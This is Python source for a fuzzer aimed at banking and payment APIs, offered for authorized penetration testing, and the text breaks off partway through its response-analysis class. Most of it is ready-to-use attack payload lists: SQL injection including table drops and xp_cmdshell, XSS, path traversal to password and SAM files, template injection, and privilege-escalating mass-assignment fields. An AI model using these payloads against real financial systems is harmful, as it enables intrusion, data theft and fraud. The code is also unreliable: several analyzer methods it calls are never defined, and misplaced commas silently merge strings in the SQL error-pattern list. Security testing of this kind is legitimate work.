#!/usr/bin/env python3
"""
banking_api_fuzzer.py — Banking API Security Fuzzer
=====================================================
Comprehensive fuzzer targeting banking/payment API endpoints.
Performs: parameter fuzzing, auth bypass (JWT alg confusion), authorization
testing (IDOR/BOLA), input validation bypass, rate limiting, mass assignment,
and response analysis.

For AUTHORIZED PENETRATION TESTING against owned targets only.
Usage:
  python banking_api_fuzzer.py --target https://api.example.com \
      --auth-token TOKEN [--users user1,user2]

Author: bionic daughter (trained by Dad/Rigoberto Gomez)
"""

import argparse
import asyncio
import json
import logging
import os
import random
import signal
import sys
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from hashlib import sha256
from pathlib import Path
from typing import Any, Optional
from urllib.parse import urlencode, urlparse, urlunparse

try:
    import aiohttp
except ImportError:
    aiohttp = None

try:
    import jwt as pyjwt
except ImportError:
    pyjwt = None

logger = logging.getLogger("banking_api_fuzzer")
VERSION = "2.1.0"
TIMESTAMP_FORMAT = "%Y-%m-%dT%H:%M:%S.%fZ"

class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

# Payload sets — curated for banking / payment contexts
SQLI_PAYLOADS = [
    "'",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    '1; DROP TABLE users--',
    '1 UNION SELECT NULL--',
    "' OR 1=1--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT password FROM users--",
    '1 OR 1=1',
    "' OR 'x'='x",
    "1') OR ('1'='1",
    "admin'--",
    "' OR 1=1 LIMIT 1--",
    "1' OR '1'='1' LIMIT 1--",
    '1%27%20OR%20%271%27%3D%271',
    '%27%20OR%201%3D1--',
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",
    "' OR SLEEP(5)--",
    '1 OR SLEEP(5)',
    '1 AND 1=1',
    '1 AND 1=2',
    "SELECT * FROM users WHERE '1'='1",
    "'; EXEC xp_cmdshell('dir')--",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    "<iframe src='javascript:alert(1)'>",
    '<details open ontoggle=alert(1)>',
    '<select autofocus onfocus=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    "';alert(1)//",
    '<xss></xss>',
    "<a href='javascript:alert(1)'>click</a>",
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<<script>alert(1)//<</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',
    '${alert(1)}',
    '#{alert(1)}',
    "{{constructor.constructor('alert(1)')()}}",
]

PATH_TRAVERSAL_PAYLOADS = [
    '../etc/passwd',
    '..\\windows\\system32\\config\\sam',
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....\\....\\....\\windows\\system32\\config\\sam',
    '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',
    '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows',
    '/etc/passwd',
    'C:\\Windows\\System32\\config\\SAM',
    '..\\..\\..\\../../../etc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '..%c1%9c..%c1%9c..%c1%9cwindows',
]

NULL_BYTE_PAYLOADS = [
    'test%00.txt',
    'test\x00.txt',
    'image.jpg%00.php',
    'file.pdf\x00.jpg',
]

JSON_PAYLOADS_MUTATIONS = [
    '{"amount": 100}',
    '{"amount": -100}',
    '{"amount": 0}',
    '{"amount": 999999999}',
    '{"amount": 1e10}',
    '{"amount": "100"}',
    '{"amount": null}',
    '{"amount": true}',
    '{"amount": [100]}',
    '{"userid": 1}',
    '{"userid": "1"}',
    '{"accountid": 1}',
    '{"accountid": "1"}',
    '{"from": 1, "to": 2, "amount": 100}',
    '{"balance": -999999}',
    '{"overdraft": true}',
    '{"role": "admin"}',
    '{"is_admin": true}',
    '{"admin": true}',
    '{"permissions": ["read","write","admin"]}',
    '{"pin": "0000"}',
    '{"otp": "000000"}',
    '{"token": "dummy"}',
    '{"session": "dummy"}',
    '{"id": 1, "name": "test"}',
    '{"user_id": 1, "account_id": 1}',
]

TIMEOUT_PAYLOADS = [
    '<script>while(true){}</script>',
    'sleep(30)',
    "1' AND SLEEP(30)--",
    "1; WAITFOR DELAY '0:0:30'--",
    '${7*7}',
    "${java.lang.Runtime.getRuntime().exec('sleep 30')}",
    '{{ delay(30000) }}',
]

# Data classes
@dataclass
class Finding:
    id: str
    severity: Severity
    category: str
    title: str
    description: str
    target: str
    endpoint: str
    method: str
    payload: str
    request_body: str = ""
    response_status: int = 0
    response_snippet: str = ""
    evidence: str = ""
    recommendation: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).strftime(TIMESTAMP_FORMAT))


@dataclass
class FuzzRequest:
    id: str
    endpoint: str
    method: str
    headers: dict
    body: Optional[str]
    params: dict
    payload_description: str
    payload_type: str
    category: str
    parent_fuzz_id: str


@dataclass
class FuzzResult:
    request: FuzzRequest
    status_code: int
    elapsed_ms: float
    response_body: str
    error: Optional[str] = None
    finding: Optional[Finding] = None


@dataclass
class TargetConfig:
    base_url: str
    auth_token: str
    users: list = field(default_factory=list)
    username_header: str = "X-User-ID"
    extra_headers: dict = field(default_factory=dict)
    skip_endpoints: list = field(default_factory=list)
    only_endpoints: list = field(default_factory=list)
    auth_header_name: str = "Authorization"
    auth_header_prefix: str = "Bearer"
    content_type: str = "application/json"
    follow_redirects: bool = False
    timeout_seconds: float = 30.0
    max_concurrent: int = 50


@dataclass
class FuzzConfig:
    target: TargetConfig
    max_requests: int = 5000
    rate_limit_delay: float = 0.0
    dry_run: bool = False
    verbose: bool = False
    output_dir: str = "fuzz_results"
    stop_on_critical: bool = False
    payloads_override: Optional[dict] = None


@dataclass
class FuzzReport:
    target: str
    start_time: str
    end_time: str
    total_requests: int
    total_findings: int
    findings_by_severity: dict
    findings_by_category: dict
    findings: list
    config: dict
    duration_seconds: float

# Utility functions

def now_iso():
    return datetime.now(timezone.utc).strftime(TIMESTAMP_FORMAT)


def truncate(s, max_len=500):
    if len(s) <= max_len:
        return s
    return s[:max_len // 2] + "\n...[truncated]...\n" + s[-max_len // 2:]


def snippet(s, max_len=200):
    return truncate(s, max_len)


def safe_json_dumps(obj):
    try:
        return json.dumps(obj, default=str, indent=2, sort_keys=True)
    except Exception:
        return str(obj)


def random_hex(n=16):
    return uuid.uuid4().hex[:n]


def fuzz_id(prefix="F"):
    return f"{prefix}-{random_hex(8)}"


def build_url(base, path, params=None):
    p = urlparse(base)
    scheme = p.scheme or "https"
    netloc = p.netloc
    if params:
        query = urlencode(params, doseq=True)
        return urlunparse((scheme, netloc, path, "", query, ""))
    return urlunparse((scheme, netloc, path, "", "", ""))


def hash_payload(payload):
    return sha256(payload.encode("utf-8", errors="replace")).hexdigest()[:12]


def ensure_dir(path):
    p = Path(path)
    p.mkdir(parents=True, exist_ok=True)
    return p


# PayloadGenerator

class PayloadGenerator:
    def __init__(self, config):
        self.config = config
        self.custom = config.payloads_override or {}

    def get_sqli(self):
        return self.custom.get("sqli", SQLI_PAYLOADS)

    def get_xss(self):
        return self.custom.get("xss", XSS_PAYLOADS)

    def get_path_traversal(self):
        return self.custom.get("path_traversal", PATH_TRAVERSAL_PAYLOADS)

    def get_null_byte(self):
        return self.custom.get("null_byte", NULL_BYTE_PAYLOADS)

    def get_json_mutations(self):
        return self.custom.get("json_mutations", JSON_PAYLOADS_MUTATIONS)

    def get_timeout(self):
        return self.custom.get("timeout", TIMEOUT_PAYLOADS)

    def generate_all(self):
        return {
            "sqli": self.get_sqli(),
            "xss": self.get_xss(),
            "path_traversal": self.get_path_traversal(),
            "null_byte": self.get_null_byte(),
            "json_mutations": self.get_json_mutations(),
            "timeout": self.get_timeout(),
        }

    def mutate_json(self, base_json):
        results = []
        raw = json.dumps(base_json)
        try:
            base = json.loads(raw)
        except Exception:
            base = {}
        for key in list(base.keys()):
            val = base[key]
            mutated = dict(base)
            if isinstance(val, int):
                mutated[key] = str(val); results.append(dict(mutated))
                mutated[key] = float(val); results.append(dict(mutated))
                mutated[key] = -abs(val); results.append(dict(mutated))
                mutated[key] = val + 1; results.append(dict(mutated))
                mutated[key] = val - 1; results.append(dict(mutated))
                mutated[key] = 0; results.append(dict(mutated))
            elif isinstance(val, str):
                mutated[key] = ""; results.append(dict(mutated))
                mutated[key] = "   "; results.append(dict(mutated))
                mutated[key] = None; results.append(dict(mutated))
            elif isinstance(val, bool):
                mutated[key] = not val; results.append(dict(mutated))
                mutated[key] = None; results.append(dict(mutated))
        extra = [
            ("admin", True), ("is_admin", True), ("role", "admin"),
            ("permissions", ["read", "write", "admin"]),
            ("balance", 999999999), ("overdraft", True),
            ("pin", "0000"), ("otp", "000000"),
            ("token", "dummy"), ("session", "dummy"),
            ("userid", 1), ("user_id", 1),
            ("accountid", 1), ("account_id", 1),
        ]
        for fname, fval in extra:
            if fname not in base:
                mutated = dict(base)
                mutated[fname] = fval
                results.append(mutated)
        if len(base) > 1:
            for key in list(base.keys())[:max(1, len(base) // 2)]:
                mutated = dict(base)
                del mutated[key]
                results.append(mutated)
        return results


# FindingAnalyzer — analyzes fuzz responses to detect security patterns

class FindingAnalyzer:
    """Analyzes fuzz responses to detect security-relevant patterns."""

    def __init__(self, config):
        self.config = config

    def analyze(self, request, result):
        """Return a Finding if the response indicates a vulnerability."""
        if result.error:
            return None
        status = result.status_code
        body = result.response_body
        payload = request.payload_description
        payload_type = request.payload_type
        auth_f = self._analyze_auth(request, result)
        if auth_f:
            return auth_f
        sqli_f = self._analyze_sqli(request, result)
        if sqli_f:
            return sqli_f
        xss_f = self._analyze_xss(request, result)
        if xss_f:
            return xss_f
        pt_f = self._analyze_path_traversal(request, result)
        if pt_f:
            return pt_f
        info_f = self._analyze_info_leak(request, result)
        if info_f:
            return info_f
        mass_f = self._analyze_mass_assignment(request, result)
        if mass_f:
            return mass_f
        timing_f = self._analyze_timing(request, result)
        if timing_f:
            return timing_f
        idor_f = self._analyze_idor(request, result)
        if idor_f:
            return idor_f
        error_f = self._analyze_error_disclosure(request, result)
        if error_f:
            return error_f
        return None

    def _analyze_auth(self, request, result):
        body = result.response_body.lower()
        status = result.status_code
        pt = request.payload_type.lower()
        if "auth" in pt or "token" in pt or "jwt" in pt:
            if status == 200:
                return Finding(
                    id=fuzz_id(), severity=Severity.CRITICAL,
                    category="Authentication Bypass",
                    title="Authentication bypass via token manipulation",
                    description=("Modified auth token was accepted. "
                                 "Server returned 200 OK — auth may be bypassed."),
                    target=self.config.target.base_url,
                    endpoint=request.endpoint, method=request.method,
                    payload=request.payload_description[:200],
                    response_status=status, response_snippet=snippet(body),
                    evidence=f"Status {status}: auth-modified request succeeded",
                    recommendation=("Implement strict token validation. Verify signature "
                                    "on every request. Reject tokens with unknown algorithms."),
                )
            if any(p in body for p in ["sql", "syntax", "exception"]):
                return Finding(
                    id=fuzz_id(), severity=Severity.HIGH,
                    category="Authentication Bypass",
                    title="Auth error reveals internal exception",
                    description=f"Rejected auth token leaked internal error: {snippet(body, 200)}",
                    target=self.config.target.base_url,
                    endpoint=request.endpoint, method=request.method,
                    payload=request.payload_description[:200],
                    response_status=status, response_snippet=snippet(body),
                    evidence="Auth rejection returned internal error details",
                    recommendation="Return generic unauthorized messages. Log details server-side.",
                )
        return None

    def _analyze_sqli(self, request, result):
        body = result.response_body
        status = result.status_code
        payload = request.payload_description
        pl = payload.lower()
        if "sqli" not in pl and "sql" not in pl:
            return None
        error_patterns = [
            "sql syntax", "mysql", "postgresql", "sqlite", "oracle,"
            "unclosed quotation", "quoted string", "odbc,"
            "sqlite3", "psycopg2", "sqlsyntax,"
            "you have an error in your sql syntax,"
            "warning: mysql", "warning: pg,"
            "sql exception", "db_error", "database error,"
        ]
        for pat in error_patterns:
            if pat in body.lower():
                return Finding(
                    id=fuzz_id(), severity=Severity.CRITICAL,
                    category="SQL Injection",
                    title="SQL error disclosure — possible injection point",
                    description=f"Payload {payload[:120]} triggered SQL error: {snippet(body, 300)}",
                    target=self.config.target.base_url,
                    endpoint=request.endpoint, method=request.method,
                    payload=payload[:200],
                    response_status=status, response_snippet=snippet(body),
                    evidence=f"Error pattern matched: {pat}",
                    recommendation=("Use parameterized queries. Never concatenate user input "
                                    "into SQL. Apply least-privilege DB accounts."),
                )
        if ("or '1'='1'" in pl or "or 1=1" in pl) and status == 200:
            if any(w in body.lower() for w in ["true", "success"]) or len(body) > 50:
                return Finding(
                    id=fuzz_id(), severity=Severity.HIGH,
                    category="SQL Injection (Blind)",
                    title="Blind SQL injection — boolean condition accepted",
                    description=f"Boolean payload {payload[:120]} returned 200 with data — server may be evaluating SQL conditions.",
                    target=self.config.target.base_url,
                    endpoint=request.endpoint, method=request.method,
                    payload=payload[:200],
                    response_status=status, response_snippet=snippet(body),
                    evidence="Boolean SQL condition returned 200 with substantive response",
                    recommendation=("Use parameterized queries. Implement input validation. "
                                    "Consider WAF rules for common SQLi patterns."),
                )
        return None
